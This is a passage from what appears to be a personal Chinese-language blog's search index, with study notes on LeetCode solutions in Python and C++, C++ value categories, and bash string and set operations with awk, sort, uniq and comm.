要找的是index，同時考慮到左閉右合，所以應該給len(nums)?\n左右兩邊重合時最多會到多少? 就是右邊給的值!!\n所以這裡右邊給len(nums)-1\n接著去比隔壁的值，決定要留哪一邊，但是是比左邊還是右邊? 左閉右合，所以右邊會多一個，所以比右邊\n接著切三個case，\n等於: 題目保證不存在 小於: 把左邊拉過來，同時不看這個中點的值，i=mid+1 大於: 把右邊拉過來，同時保留(重合時就是這個值)這個中點的值，j=mid class Solution: def findPeakElement(self, nums: List[int]) -\u0026gt; int: nums = nums i = 0 j = len(nums)-1 # len(nums)-1 重合時會等於的值 while i \u0026lt; j: mid = i + (j-i)//2 print(mid) if nums[mid] \u0026gt; nums[mid+1]: j = mid # keep it else: i = mid+1 # drop it return i ","permalink":"https://littlebees.github.io/2020/12/leetcode-162-find-peak-element/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e二分搜怎麼那麼難搞\u003c/p\u003e","title":"leetcode-162 - Find Peak Element"},{"content":"動機 把二分搜最討厭的部分完全展示的一題\nProblem Given an array of integers citations where citations[i] is the number of citations a researcher received for their ith paper and citations is sorted in an ascending order, return compute the researcher's h-index.\nAccording to the definition of h-index on Wikipedia: A scientist has an index h if h of their n papers have at least h citations each, and the other n − h papers have no more than h citations each.\nIf there are several possible values for h, the maximum one is taken as the h-index.\nYou must write an algorithm that runs in logarithmic time.\nExample 1:\nInput: citations = [0,1,3,5,6]Output: 3Explanation: [0,1,3,5,6] means the researcher has 5 papers in total and each of them had received 0, 1, 3, 5, 6 citations respectively.Since the researcher has 3 papers with at least 3 citations each and the remaining two with no more than 3 citations each, their h-index is 3.Example 2:\nInput: citations = [1,2,100]Output: 2 Constraints:\nn == citations.length1 \u003c= n \u003c= 1050 \u003c= citations[i] \u003c= 1000citations is sorted in ascending order. Sol h-index的定義是\n前N個paper的引用數大於等於N\n因為已經排序了，所以第i個，代表前i個的引用數都小於等於他\n所以h-index就是總長減i\n但痛苦的是\ni是index h-index的range是 0~總長，故i的範圍是0~總長 如果要處理的漂亮要在\n終止條件 算中點 縮小範圍時 下功夫\nVer1 終止條件: 包含右邊 算中點: 無條件進位 縮小範圍時: 不保留原本的index，兩邊都往內縮 class Solution: def hIndex(self, cs: List[int]) -\u0026gt; int: if not cs: return 0 i = 0 j = len(cs)-1 while i \u0026lt;= j: mid = (i+j)//2 if (i+j) % 2 == 0 else (i+j+1)//2 # 無條件進位 print(i,j,mid) if cs[mid] == len(cs) - mid: return cs[mid] elif cs[mid] \u0026gt; len(cs) - mid: j = mid-1 else: i = mid+1 print(i,j) return len(cs)-i Ver2 終止條件: 不包含右邊 算中點: 無條件捨去 縮小範圍時: 保留右邊的index class Solution: def hIndex(self, cs: List[int]) -\u0026gt; int: if not cs: return 0 i = 0 j = len(cs) while i \u0026lt; j: mid = (i+j)//2 # 無條件捨去 if cs[mid] == len(cs) - mid: return cs[mid] elif cs[mid] \u0026gt; len(cs) - mid: j = mid else: i = mid+1 return len(cs)-i Ref [Algorithm, Leetcode] H-Index II 求H指数之二\n","permalink":"https://littlebees.github.io/2020/12/leetcode-275-h-index-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e把二分搜最討厭的部分完全展示的一題\u003c/p\u003e","title":"leetcode-275 - H-Index II"},{"content":"動機 練heapq\nProblem We have a collection of stones, each stone has a positive integer weight.\nEach turn, we choose the two heaviest stones and smash them together. Suppose the stones have weights x and y with x \u003c= y. The result of this smash is:\nIf x == y, both stones are totally destroyed;If x != y, the stone of weight x is totally destroyed, and the stone of weight y has new weight y-x.At the end, there is at most 1 stone left. Return the weight of this stone (or 0 if there are no stones left.)\nExample 1:\nInput: [2,7,4,1,8,1]Output: 1Explanation: We combine 7 and 8 to get 1 so the array converts to [2,4,1,1,1] then,we combine 2 and 4 to get 2 so the array converts to [2,1,1,1] then,we combine 2 and 1 to get 1 so the array converts to [1,1,1] then,we combine 1 and 1 to get 0 so the array converts to [1] then that's the value of last stone. Note:\n1 \u003c= stones.length \u003c= 301 \u003c= stones[i] \u003c= 1000 Sol 拿前二大的相減，再塞回去\nclass Solution: def lastStoneWeight(self, q: List[int]) -\u0026gt; int: q = [-x for x in q] heapify(q) while len(q) \u0026gt; 1: a = -heappop(q) b = -heappop(q) if a != b: heappush(q, -a+b) return -q[0] if len(q) \u0026gt; 0 else 0 ","permalink":"https://littlebees.github.io/2020/12/leetcode-1046-last-stone-weight/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e練heapq\u003c/p\u003e","title":"leetcode-1046 - Last Stone Weight"},{"content":"動機 medium!?\nProblem Given a non-empty list of words, return the k most frequent elements.\nYour answer should be sorted by frequency from highest to lowest. If two words have the same frequency, then the word with the lower alphabetical order comes first.\nExample 1:\nInput: [i, love, leetcode, i, love, coding], k = 2Output: [i, love]Explanation: i and love are the two most frequent words. Note that i comes before love due to a lower alphabetical order.\nExample 2:\nInput: [the, day, is, sunny, the, the, the, sunny, is, is], k = 4Output: [the, is, sunny, day]Explanation: the, is, sunny and day are the four most frequent words, with the number of occurrence being 4, 3, 2 and 1 respectively.\nNote:\nYou may assume k is always valid, 1 ≤ k ≤ number of unique elements.Input words contain only lowercase letters.\nFollow up:\nTry to solve it in O(n log k) time and O(n) extra space.\nSol 兩個hash去對\nstring =\u0026gt; 次數 次數 =\u0026gt; [string] BTW，from collections import Counter 可以計算 string =\u0026gt; 次數\nclass Solution: def topKFrequent(self, ws: List[str], kk: int) -\u0026gt; List[str]: w_t = {} t_ws = {} for w in ws: if w not in w_t: w_t[w] = 1 else: w_t[w] += 1 for (k,v) in w_t.items(): if v not in t_ws: t_ws[v] = [k] else: t_ws[v].append(k) t_iter = iter(sorted(t_ws.keys(),reverse=True)) ret = [] while kk != 0: t = next(t_iter) if kk \u0026lt; len(t_ws[t]): ret += sorted(t_ws[t])[:kk] kk = 0 elif kk == len(t_ws[t]): ret += sorted(t_ws[t]) kk = 0 else: ret += sorted(t_ws[t]) kk -= len(t_ws[t]) return ret ","permalink":"https://littlebees.github.io/2020/12/leetcode-692-top-k-frequent-words/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003emedium!?\u003c/p\u003e","title":"leetcode-692 - Top K Frequent Words"},{"content":"動機 值得回味的題目\nProblem A super ugly number is a positive integer whose prime factors are in the array primes.\nGiven an integer n and an array of integers primes, return the nth super ugly number.\nThe nth super ugly number is guaranteed to fit in a 32-bit signed integer.\nExample 1:\nInput: n = 12, primes = [2,7,13,19]Output: 32Explanation: [1,2,4,7,8,13,14,16,19,26,28,32] is the sequence of the first 12 super ugly numbers given primes = [2,7,13,19].Example 2:\nInput: n = 1, primes = [2,3,5]Output: 1Explanation: 1 has no prime factors, therefore all of its prime factors are in the array primes = [2,3,5]. Constraints:\n1 \u003c= n \u003c= 1061 \u003c= primes.length \u003c= 1002 \u003c= primes[i] \u003c= 1000primes[i] is guaranteed to be a prime number.All the values of primes are unique and sorted in ascending order. Sol1: BFS 算完就往queue裡面塞\nclass Solution: def nthSuperUglyNumber(self, n: int, ps: List[int]) -\u0026gt; int: q = [1] nn = set([1]) while n != 1: x = heappop(q) for z in [x*y for y in ps]: if z not in nn: heappush(q, z) nn.add(z) #print(q) n -= 1 return heappop(q) Sol2: dp 從最後一個值去算乘每個質數，找出最小與沒有重複的\nclass Solution: def nthSuperUglyNumber(self, n: int, ps: List[int]) -\u0026gt; int: q = [1] idx = [0]*len(ps) for i in range(1,n): nowI = -1 tmp = q[idx[0]]*ps[0]+1 for j in range(0,len(ps)): tmp2 = q[idx[j]]*ps[j] oldtmp = tmp if tmp2 !=tmp: tmp = min(tmp, tmp2) if tmp != oldtmp: nowI = j else: idx[j] += 1 idx[nowI] += 1 q.append(tmp) #print(q) return q[-1] Sol3: dp+bfs (case study) 在queue中放\n(算出來的值, 質數, 被算到的次數)\n把算出來的值放入queue中，但是要看放入queue的是不是有重複的值\nclass Solution: def nthSuperUglyNumber(self, n: int, primes: List[int]) -\u0026gt; int: q = [(p, p, 1) for p in primes] heapq.heapify(q) dp = [1] while len(dp) \u0026lt; n: dp.append(q[0][0]) while q and q[0][0] == dp[-1]: _, p, i = heapq.heappop(q) heapq.heappush(q, (dp[i] * p, p, i + 1)) return dp[-1] ","permalink":"https://littlebees.github.io/2020/12/leetcode-313-super-ugly-number/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e值得回味的題目\u003c/p\u003e","title":"leetcode-313 - Super Ugly Number"},{"content":"動機 這題是medium!?\nProblem Given a string s, sort it in decreasing order based on the frequency of characters, and return the sorted string.\nExample 1:\nInput: s = treeOutput: eertExplanation: 'e' appears twice while 'r' and 't' both appear once.So 'e' must appear before both 'r' and 't'. Therefore eetr is also a valid answer.Example 2:\nInput: s = cccaaaOutput: aaacccExplanation: Both 'c' and 'a' appear three times, so aaaccc is also a valid answer.Note that cacaca is incorrect, as the same characters must be together.Example 3:\nInput: s = AabbOutput: bbAaExplanation: bbaA is also a valid answer, but Aabb is incorrect.Note that 'A' and 'a' are treated as two different characters. Constraints:\n1 \u003c= s.length \u003c= 5 * 105s consists of English letters and digits. Sol 就硬幹，因為沒有用特別的工具統計，所以performance比較低?\nclass Solution: def frequencySort(self, s: str) -\u0026gt; str: tbl = {} for c in s: if c not in tbl: tbl[c] = 1 else: tbl[c] += 1 s = list(s) s = sorted(s,key=lambda x: -tbl[x]) # 可以用heapq取代sort return \u0026#39;\u0026#39;.join(s) ","permalink":"https://littlebees.github.io/2020/12/leetcode-451-sort-characters-by-frequency/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這題是medium!?\u003c/p\u003e","title":"leetcode-451 - Sort Characters By Frequency"},{"content":"動機 資料本身也是有特性的\nProblem Given an unsorted integer array nums, return the smallest missing positive integer.\nYou must implement an algorithm that runs in O(n) time and uses constant extra space.\nExample 1:\nInput: nums = [1,2,0]Output: 3Example 2:\nInput: nums = [3,4,-1,1]Output: 2Example 3:\nInput: nums = [7,8,9,11,12]Output: 1 Constraints:\n1 \u003c= nums.length \u003c= 5 * 105-231 \u003c= nums[i] \u003c= 231 - 1 Sol 從array中找出沒有的最小的正整數\n同時要求時間是O(n)，空間是常數\n如果不管空間，就是用hash，走兩次就ok了\n但現在不能用hash，又要類似排序的效果，這時就只能看有沒有辦法把每筆資料定位\n注意到array的index一定是正整數，又可以一一對應，i對到i+1\n所以接下來的任務就是讓每個i盡量是i+1。\n那麼要從i+1到最後一個去找嗎? 這樣會變成O(n^2)!!\n如果資料是在範圍內的，就一定只有那個位置可以擺，所以就是根據資料把資料換到正確的位置，反覆換下去，直到合法或是無法再換了\n這個過程讓我想到，seasoned schemer的scramble，與little mler的exception的例子\nclass Solution: def firstMissingPositive(self, nums: List[int]) -\u0026gt; int: if not nums: return 1 for i in range(0,len(nums)): while (nums[i] \u0026gt; 0 and nums[i] \u0026lt;= len(nums)) and nums[i] != nums[nums[i]-1]: tmp = nums[nums[i]-1] nums[nums[i]-1] = nums[i] nums[i] = tmp for i in range(0,len(nums)): if i+1 != nums[i]: return i+1 return len(nums)+1 ","permalink":"https://littlebees.github.io/2020/12/leetcode-41-first-missing-positive/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e資料本身也是有特性的\u003c/p\u003e","title":"leetcode-41 - First Missing Positive"},{"content":"動機 列舉十分可怕 不要拘泥於題目 新看法: 把資料畫成座標圖 Problem You are given an array prices where prices[i] is the price of a given stock on the ith day.\nFind the maximum profit you can achieve. You may complete as many transactions as you like (i.e., buy one and sell one share of the stock multiple times).\nNote: You may not engage in multiple transactions simultaneously (i.e., you must sell the stock before you buy again).\nExample 1:\nInput: prices = [7,1,5,3,6,4]Output: 7Explanation: Buy on day 2 (price = 1) and sell on day 3 (price = 5), profit = 5-1 = 4.Then buy on day 4 (price = 3) and sell on day 5 (price = 6), profit = 6-3 = 3.Example 2:\nInput: prices = [1,2,3,4,5]Output: 4Explanation: Buy on day 1 (price = 1) and sell on day 5 (price = 5), profit = 5-1 = 4.Note that you cannot buy on day 1, buy on day 2 and sell them later, as you are engaging multiple transactions at the same time. You must sell before buying again.Example 3:\nInput: prices = [7,6,4,3,1]Output: 0Explanation: In this case, no transaction is done, i.e., max profit = 0. Constraints:\n1 \u003c= prices.length \u003c= 3 * 1040 \u003c= prices[i] \u003c= 104 Sol1: TLE 因為可以無限次，又要買高賣低，所以就用列舉去找\nclass Solution: def num1(self, ps): ans = 0 lowest_price = ps[0] for x in range(0, len(ps)): lowest_price = min([lowest_price, ps[x]]) ans = max([ans, ps[x] - lowest_price]) return ans @functools.cache def f(self, i, j): ret = 0 if i == j: ret = 0 elif j - i == 1: ret = max(0, self.ps[j] - self.ps[i]) elif j - i == 2: # What!? ret = max(0, self.num1( self.ps[i:j+1]), self.ps[j] - min(self.ps[i], self.ps[i+1])) else: ret = max([self.f(i, k) + self.f(k + 1, j) for k in range(i + 1, j)]) ret = max(ret, self.num1(self.ps[i:j+1])) #print(\u0026#34;at \u0026#34;, i, j, ret) return ret def maxProfit(self, prices: List[int]) -\u0026gt; int: self.ps = prices return self.f(0, len(prices)-1) Sol2: AC 從最低到最高的距離，與這之間點與點之間的間隔的加總是一樣的!! 例\n1, 3, 4, 7 7-1 = 6 3-1 + 4-3 + 7-4 = 6 買了就一定要賣掉才能買 \u0026lt;= 不用特別等!! 所以，只要把所有利潤加起來就好，除了會覆蓋到最地道最高的case還有，還有中間震盪的case\nclass Solution: def maxProfit(self, prices: List[int]) -\u0026gt; int: ans = 0 for i in range(0,len(prices)-1): if prices[i] \u0026lt; prices[i+1]: ans += prices[i+1]-prices[i] return ans Ref 因為這位大大的圖我才懂為什麼是加總\n","permalink":"https://littlebees.github.io/2020/12/leetcode-122-best-time-to-buy-and-sell-stock-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e列舉十分可怕\u003c/li\u003e\n\u003cli\u003e不要拘泥於題目\u003c/li\u003e\n\u003cli\u003e新看法: 把資料畫成座標圖\u003c/li\u003e\n\u003c/ol\u003e","title":"leetcode-122 - Best Time to Buy and Sell Stock II"},{"content":"動機 兩題很像，所以就一起寫\nProblem Design a data structure that follows the constraints of a Least Recently Used (LRU) cache.\nImplement the LRUCache class:\nLRUCache(int capacity) Initialize the LRU cache with positive size capacity.int get(int key) Return the value of the key if the key exists, otherwise return -1.void put(int key, int value) Update the value of the key if the key exists. Otherwise, add the key-value pair to the cache. If the number of keys exceeds the capacity from this operation, evict the least recently used key.The functions get and put must each run in O(1) average time complexity.\nExample 1:\nInput[LRUCache, put, put, get, put, get, put, get, get, get][[2], [1, 1], [2, 2], [1], [3, 3], [2], [4, 4], [1], [3], [4]]Output[null, null, null, 1, null, -1, null, -1, 3, 4]ExplanationLRUCache lRUCache = new LRUCache(2);lRUCache.put(1, 1); // cache is {1=1}lRUCache.put(2, 2); // cache is {1=1, 2=2}lRUCache.get(1); // return 1lRUCache.put(3, 3); // LRU key was 2, evicts key 2, cache is {1=1, 3=3}lRUCache.get(2); // returns -1 (not found)lRUCache.put(4, 4); // LRU key was 1, evicts key 1, cache is {4=4, 3=3}lRUCache.get(1); // return -1 (not found)lRUCache.get(3); // return 3lRUCache.get(4); // return 4 Constraints:\n1 \u003c= capacity \u003c= 30000 \u003c= key \u003c= 1040 \u003c= value \u003c= 105At most 2 * 105 calls will be made to get and put. 146: LRU Cache 為了讓get是O(1)，需要hash\n為了符合LRU，就用Linked List，把最近使用的放到最上面，最下面的就是要被驅逐的key\n這裡是用c++寫，因為python的Linked List，要自幹 雖然說可以用deque模擬，但是沒辦法把node移到頂端，沒辦法操作reference，所以就改用C++的list來做了\nclass LRUCache { private: list\u0026lt;int\u0026gt; l; int c; ordered_map\u0026lt;int, pair\u0026lt;list\u0026lt;int\u0026gt;::iterator, int\u0026gt;\u0026gt; m; public: pair\u0026lt;list\u0026lt;int\u0026gt;::iterator, int\u0026gt;\u0026amp; moveToTop(int key) { auto\u0026amp; tmp = m[key]; l.erase(std::get\u0026lt;0\u0026gt;(tmp)); l.push_front(key); auto\u0026amp;\u0026amp; ret = make_pair(l.begin(), std::get\u0026lt;1\u0026gt;(tmp)); m[key] = ret; return m[key]; } LRUCache(int capacity): c(capacity) { } int get(int key) { auto tmp = m.find(key); if(tmp != m.end()) { auto\u0026amp; tmp = moveToTop(key); return std::get\u0026lt;1\u0026gt;(tmp); } else { return -1; } } void put(int key, int value) { auto exist = m.find(key); if (exist != m.end()) { auto\u0026amp; tmp = moveToTop(key); m[key] = std::move(make_pair(std::get\u0026lt;0\u0026gt;(tmp), value)); } else { if(l.size() \u0026gt;= c) { int evict = l.back(); m.erase(evict); l.pop_back(); } l.push_front(key); m[key] = std::move(make_pair(l.begin(),value)); } } }; ","permalink":"https://littlebees.github.io/2020/12/leetcode-146-lru-cache/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e兩題很像，所以就一起寫\u003c/p\u003e","title":"leetcode-146 - LRU Cache"},{"content":"動機 兩題很像，所以就一起寫\nProblem Design and implement a data structure for a Least Frequently Used (LFU) cache.\nImplement the LFUCache class:\nLFUCache(int capacity) Initializes the object with the capacity of the data structure.int get(int key) Gets the value of the key if the key exists in the cache. Otherwise, returns -1.void put(int key, int value) Update the value of the key if present, or inserts the key if not already present. When the cache reaches its capacity, it should invalidate and remove the least frequently used key before inserting a new item. For this problem, when there is a tie (i.e., two or more keys with the same frequency), the least recently used key would be invalidated.To determine the least frequently used key, a use counter is maintained for each key in the cache. The key with the smallest use counter is the least frequently used key.\nWhen a key is first inserted into the cache, its use counter is set to 1 (due to the put operation). The use counter for a key in the cache is incremented either a get or put operation is called on it.\nThe functions get and put must each run in O(1) average time complexity.\nExample 1:\nInput[LFUCache, put, put, get, put, get, get, put, get, get, get][[2], [1, 1], [2, 2], [1], [3, 3], [2], [3], [4, 4], [1], [3], [4]]Output[null, null, null, 1, null, -1, 3, null, -1, 3, 4]Explanation// cnt(x) = the use counter for key x// cache=[] will show the last used order for tiebreakers (leftmost element is most recent)LFUCache lfu = new LFUCache(2);lfu.put(1, 1); // cache=[1,_], cnt(1)=1lfu.put(2, 2); // cache=[2,1], cnt(2)=1, cnt(1)=1lfu.get(1); // return 1 // cache=[1,2], cnt(2)=1, cnt(1)=2lfu.put(3, 3); // 2 is the LFU key because cnt(2)=1 is the smallest, invalidate 2. // cache=[3,1], cnt(3)=1, cnt(1)=2lfu.get(2); // return -1 (not found)lfu.get(3); // return 3 // cache=[3,1], cnt(3)=2, cnt(1)=2lfu.put(4, 4); // Both 1 and 3 have the same cnt, but 1 is LRU, invalidate 1. // cache=[4,3], cnt(4)=1, cnt(3)=2lfu.get(1); // return -1 (not found)lfu.get(3); // return 3 // cache=[3,4], cnt(4)=1, cnt(3)=3lfu.get(4); // return 4 // cache=[3,4], cnt(4)=2, cnt(3)=3 Constraints:\n0 \u003c= capacity \u003c= 1040 \u003c= key \u003c= 1050 \u003c= value \u003c= 109At most 2 * 105 calls will be made to get and put. 460 LFU Cache 與146不同的是要想辦法記錄每個key的頻率，一定要嘛? 因為當頻率一樣時要變成LRU。\n這樣不能像146把所有key放在list中，所以用map紀錄次數，把key放到對應的list中。\n為了驅逐的速度上去，最後就是記下如果滿了的話，要驅逐哪一個次數的list的最後一個key\nclass LFUCache { private: unordered_map\u0026lt;int,list\u0026lt;int\u0026gt;\u0026gt; l; int c; unordered_map\u0026lt;int, tuple\u0026lt;list\u0026lt;int\u0026gt;::iterator, int, int\u0026gt;\u0026gt; m; // iter, value, times int last_frq = 1; public: // new empty list tuple\u0026lt;list\u0026lt;int\u0026gt;::iterator, int, int\u0026gt;\u0026amp; moveToTop(int key) { auto\u0026amp; tmp = m[key]; l[std::get\u0026lt;2\u0026gt;(tmp)].erase(std::get\u0026lt;0\u0026gt;(tmp)); l[std::get\u0026lt;2\u0026gt;(tmp)+1].push_front(key); if (l[std::get\u0026lt;2\u0026gt;(tmp)].empty() \u0026amp;\u0026amp; last_frq == std::get\u0026lt;2\u0026gt;(tmp)) last_frq = std::get\u0026lt;2\u0026gt;(tmp)+1; auto ret = make_tuple(l[std::get\u0026lt;2\u0026gt;(tmp)+1].begin(), std::get\u0026lt;1\u0026gt;(tmp),std::get\u0026lt;2\u0026gt;(tmp)+1); m[key] = ret; return m[key]; } LFUCache(int capacity): c(capacity) { } int get(int key) { auto tmp = m.find(key); if(tmp != m.end()) { auto\u0026amp; tmp = moveToTop(key); return std::get\u0026lt;1\u0026gt;(tmp); } else { return -1; } } void put(int key, int value) { auto exist = m.find(key); if (exist != m.end()) { auto\u0026amp; tmp = moveToTop(key); m[key] = make_tuple(std::get\u0026lt;0\u0026gt;(tmp), value, std::get\u0026lt;2\u0026gt;(tmp)); } else { if(m.size() \u0026gt;= c \u0026amp;\u0026amp; m.size() \u0026gt; 0) { int evict = l[last_frq].back(); m.erase(evict); l[last_frq].pop_back(); if (l[last_frq].empty()) { l.erase(last_frq); last_frq = l.begin()-\u0026gt;first; } //cout\u0026lt;\u0026lt; \u0026#34;evict: \u0026#34; \u0026lt;\u0026lt; evict \u0026lt;\u0026lt;\u0026#39;\\n\u0026#39;; } if (m.size() \u0026lt; c) { l[1]; l[1].push_front(key); m[key] = make_tuple(l[1].begin(),value, 1); last_frq = 1; } } } }; ","permalink":"https://littlebees.github.io/2020/12/leetcode-460-lfu-cache/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e兩題很像，所以就一起寫\u003c/p\u003e","title":"leetcode-460 - LFU Cache"},{"content":"動機 自從多了move之後，C++就整個不一樣了。 變得十分的詭異，move與現在要講的這個 Value Categories。\n定義一些關鍵字(以十分非正式的方式) identity: 變數，應該說有可以透過變數或是ptr存取到的東西 object: class或是struct 架構 expression glvaue lvalue xvalue rvalue prvalue xvalue prvalue 沒有identity的資料，也就是沒有被assign或是與object的attr有關的資料\n像\nliteral(string是lvalue，他本身就是array，但不能改) lambda 沒有被assign的bject 臨時被造出來的object xvalue 很快就會被搬空(\u0026amp;\u0026amp;, std::move)的變數(或是位置)，或是臨時被造出來的object上的變數\n主要xvalue就是變數，但很快就會消失，變數自身、裡面的資料\n例子\nstruct X { int n; }; extern X x; 4; // prvalue: does not have an identity // 如果宿主是lvalue，attr也是lvalue x; // lvalue x.n; // lvalue std::move(x); // xvalue std::forward\u0026lt;X\u0026amp;\u0026gt;(x); // lvalue // 如果宿主是prvalue，attr會是xvalue X{4}; // prvalue: does not have an identity X{4}.n; // xvalue lvalue 沒有被move的變數都是lvalue，另外function要看他的return type，如果是lvalue就是lvalue，不然就是prvalue\n例子\nX x; // x is an lvalue X* px = \u0026amp;x; // px is an lvalue *px = X{}; // *px is also an lvalue, X{} is a prvalue X* foo_ptr(); // foo_ptr() is a prvalue, cuz X* is prvalue X\u0026amp; foo_ref(); // foo_ref() is an lvalue, cuz X\u0026amp; is lvalue lvalue \u0026amp; lvalue 與 prvalue \u0026amp; xvalue 可以用派生的感覺去看\nlvalue的attr是lvalue (有變數去存)\nprvalue的attr是xvalue (依附在沒有存在變數的資料上)\nRef 讓我看懂這到底是什麼鬼東西好文章，推爆 What are rvalues, lvalues, xvalues, glvalues, and prvalues?\n","permalink":"https://littlebees.github.io/2020/12/cpp%E7%9A%84value-categories/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e自從多了move之後，C++就整個不一樣了。\n變得十分的詭異，move與現在要講的這個 Value Categories。\u003c/p\u003e","title":"cpp的Value Categories"},{"content":"動機 想把bash的某個字串轉成大寫，但因為bash太舊，所以不能用substitution來做，只能用awk\n所以來整理一下，在bash做字串處理的方式\nbash substitution 大寫 第一個字: ${var^} 所有字: ${var^^\u0026lt;pat\u0026gt;} 小寫 第一個字: ${var,} 所有字: ${var,,\u0026lt;pat\u0026gt;} 找符合的所有變數名: ${!VAR*} \u0026lt;= VAR1=1; VAR2=2; substring: ${VAR:pos(included):len} replace once: ${VAR/pat1/pat2} all: ${VAR//pat1/pat2} remove front lazy: ${VAR#PAT} eagal: ${VAR##PAT} back lazy: ${VAR%PAT} eagal: ${VAR%%PAT} strlen: {% raw %}${#VAR}{% endraw %} default val set: ${VAR:=val} \u0026lt;= echo $VAR # val get: ${VAR:-val} \u0026lt;= echo $VAR # \u0026lt;empty\u0026gt; cut string -\u0026gt; [string]\n像是someletters_12345_moreleters.ext只取12345 可以用cut去切，用_去分[someletters, 12345, moreleters.ext] 之後拿第2欄，cut -d '_' -f 2\nawk C的語法，py2的感覺，只有hash沒有array\nawk是針對文字檔案的工具，基本上\nBEGIN {} PAT1 {} PAT2 {} # .... END {} 讀第一行時會先跑BEGIN，可以初始化變數，等最後一行跑完就會跑END 之後就是一行一行看，如果對到pattern就跑那個block\n注意，awk的string只有double quote，沒有single quote\nfunction string_functions(localvar, arr) { localvar = \u0026#34;fooooobar\u0026#34;; sub(\u0026#34;fo+\u0026#34;, \u0026#34;Meet me at the \u0026#34;, localvar); # localvar =\u0026gt; \u0026#34;Meet me at the bar\u0026#34; gsub(\u0026#34;e+\u0026#34;, \u0026#34;.\u0026#34;, localvar); # localvar =\u0026gt; \u0026#34;m..t m. at th. bar\u0026#34; # Search for a string that matches a regular expression # index() does the same thing, but doesn\u0026#39;t allow a regular expression match(localvar, \u0026#34;t\u0026#34;); # =\u0026gt; 4, since the \u0026#39;t\u0026#39; is the fourth character sprintf(\u0026#34;%s %d %d %d\u0026#34;, \u0026#34;Testing\u0026#34;, 1, 2, 3); # =\u0026gt; \u0026#34;Testing 1 2 3\u0026#34; substr(\u0026#34;foobar\u0026#34;, 2, 3); # =\u0026gt; \u0026#34;oob\u0026#34; substr(\u0026#34;foobar\u0026#34;, 4); # =\u0026gt; \u0026#34;bar\u0026#34; length(\u0026#34;foo\u0026#34;); # =\u0026gt; 3 tolower(\u0026#34;FOO\u0026#34;); # =\u0026gt; \u0026#34;foo\u0026#34; toupper(\u0026#34;foo\u0026#34;); # =\u0026gt; \u0026#34;FOO\u0026#34; } # /^fo+bar$/ # a \u0026gt; 0 (boolean exp) $0 ~ /^fo+bar$/ { # Inside here, we have access to a number of useful variables, already # pre-loaded for us: # $0 is the entire line # $3 is the third field, the age, which is what we\u0026#39;re interested in here # NF is the number of fields, which should be 3 # NR is the number of records (lines) seen so far # FILENAME is the name of the file being processed # FS is the field separator being used, which is \u0026#34; \u0026#34; here # $NF =\u0026gt; $3 multidim[0,0] = \u0026#34;foo\u0026#34;; assoc[\u0026#34;foo\u0026#34;] = \u0026#34;bar\u0026#34;; n = split(\u0026#34;foo:bar:baz\u0026#34;, arr, \u0026#34;:\u0026#34;); /* arr = [\u0026#34;foo\u0026#34;, \u0026#34;bar\u0026#34;, \u0026#34;baz\u0026#34;] */ if (\u0026#34;foo\u0026#34; in assoc) print \u0026#34;Fooey!\u0026#34;; for (key in assoc) print assoc[key]; delete arr[1]; string_functions(assoc, multidim); } 用someletters_12345_moreleters.ext只取12345當例子 awk 'BEGIN{FS=\u0026quot;_\u0026quot;} {print $2}'\nRef How To Use Bash Parameter Substitution Like A Pro awk in x minutes\n","permalink":"https://littlebees.github.io/2020/12/bash%E7%9A%84%E5%AD%97%E4%B8%B2%E6%93%8D%E4%BD%9C/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e想把bash的某個字串轉成大寫，但因為bash太舊，所以不能用substitution來做，只能用awk\u003c/p\u003e\n\u003cp\u003e所以來整理一下，在bash做字串處理的方式\u003c/p\u003e","title":"bash的字串操作"},{"content":"動機 之前為了從log中找出遺失的pid，所以找到了講怎麼用bash做set operation\n超實用，紀錄一下\n資料結構 Set有許多種實做方法，像hash或是array bash沒有hash只有array，所以接下去就是看如何用array實現\n這裡就是去重複加排序過就是set\n需要工具 排序: sort -n 去重複: uniq 比較: grep, comm comm 會一行一行的比，輸出三個column，\n在第一個file有的行 在第二個file有的行 在兩個file都有的行 用tab分開，像\n1 2 3 awk Set operation Union 可以像讓兩個array變成set在合併再轉成一次set\narray =\u0026gt; set array =\u0026gt; set set * set =\u0026gt; array array =\u0026gt; set cat \u0026lt;(sort A | uniq) \u0026lt;(sort B | uniq) | sort | uniq 或是，先合併再轉成set\narray * array =\u0026gt; array array =\u0026gt; set cat A B | sort | uniq Intersection 先合併再取重複\narray * array =\u0026gt; array array =\u0026gt; set cat A B | sort -n | uniq -d # d for duplicate # OR comm -12 \u0026lt;(sort -n A) \u0026lt;(sort -n B) # dont print things only appear in first file or second file Complement comm -23 \u0026lt;(sort -n A) \u0026lt;(sort -n B) Cardinality 就計數\nsort -n A | uniq | wc -l Symmetric Difference 取只在某一個檔案存在的東西\ncomm -3 \u0026lt;(cat A | sort -n) \u0026lt;(cat B | sort -n) | sed \u0026#39;s/\\t//g\u0026#39; | awk \u0026#39;NF\u0026#39; | sort -n # awk \u0026#39;NF\u0026#39; is for deleting empty lines IsSubset comm -23 \u0026lt;(sort subset | uniq) \u0026lt;(sort set | uniq) | head -1 Ref Set Operations in the Unix Shell recursion function with awk\n","permalink":"https://littlebees.github.io/2020/12/bash%E4%B8%8A%E5%81%9A%E9%9B%86%E5%90%88%E6%93%8D%E4%BD%9C/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e之前為了從log中找出遺失的pid，所以找到了講怎麼用bash做set operation\u003c/p\u003e\n\u003cp\u003e超實用，紀錄一下\u003c/p\u003e","title":"bash上做集合操作"},{"content":"動機 想到就來寫一寫\npromise is monad 